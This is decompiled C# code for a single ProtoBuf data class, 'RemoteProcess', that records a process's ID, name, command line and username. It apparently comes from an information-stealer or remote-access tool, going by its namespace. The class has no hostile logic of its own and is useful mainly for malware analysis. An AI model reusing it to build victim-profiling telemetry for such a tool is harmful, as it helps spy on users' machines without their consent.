using System;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x0200016D RID: 365
	[ProtoContract(Name = "RemoteProcess")]
	public class RemoteProcess
	{
		// Token: 0x170002F4 RID: 756
		// (get) Token: 0x06000BCB RID: 3019 RVA: 0x00009272 File Offset: 0x00007472
		// (set) Token: 0x06000BCC RID: 3020 RVA: 0x0000927A File Offset: 0x0000747A
		[ProtoMember(1, Name = "ProcessID")]
		public int ProcessID { get; set; }

		// Token: 0x170002F5 RID: 757
		// (get) Token: 0x06000BCD RID: 3021 RVA: 0x00009283 File Offset: 0x00007483
		// (set) Token: 0x06000BCE RID: 3022 RVA: 0x0000928B File Offset: 0x0000748B
		[ProtoMember(2, Name = "ProcessName")]
		public string ProcessName { get; set; }

		// Token: 0x170002F6 RID: 758
		// (get) Token: 0x06000BCF RID: 3023 RVA: 0x00009294 File Offset: 0x00007494
		// (set) Token: 0x06000BD0 RID: 3024 RVA: 0x0000929C File Offset: 0x0000749C
		[ProtoMember(3, Name = "ProcessCommandLine")]
		public string ProcessCommandLine { get; set; }

		// Token: 0x170002F7 RID: 759
		// (get) Token: 0x06000BD1 RID: 3025 RVA: 0x000092A5 File Offset: 0x000074A5
		// (set) Token: 0x06000BD2 RID: 3026 RVA: 0x000092AD File Offset: 0x000074AD
		[ProtoMember(4, Name = "ProcessUsername")]
		public string ProcessUsername { get; set; }
	}
}
